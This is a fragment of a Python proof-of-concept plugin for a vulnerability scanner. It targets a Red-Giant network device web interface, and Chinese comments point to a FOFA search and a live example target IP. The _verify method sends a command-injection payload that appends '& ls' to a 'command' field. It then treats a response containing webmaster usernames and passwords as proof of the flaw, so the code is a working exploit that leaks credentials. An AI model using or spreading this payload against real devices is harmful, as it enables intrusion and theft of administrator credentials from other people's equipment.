...
class POC(POCBase):
    ...
    _info = {
        ...
        """,                     # fofa搜索语句
        "example" : "http://124.115.228.182:9999",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }
    ...
    def _verify(self):
        ...
        data = "command=show webmaster user%20&%20ls&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."
        ...
        try:
            ...
            if "webmaster level" in req.text and "username" in req.text and "password" in req.text:#req.status_code == 200 and :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
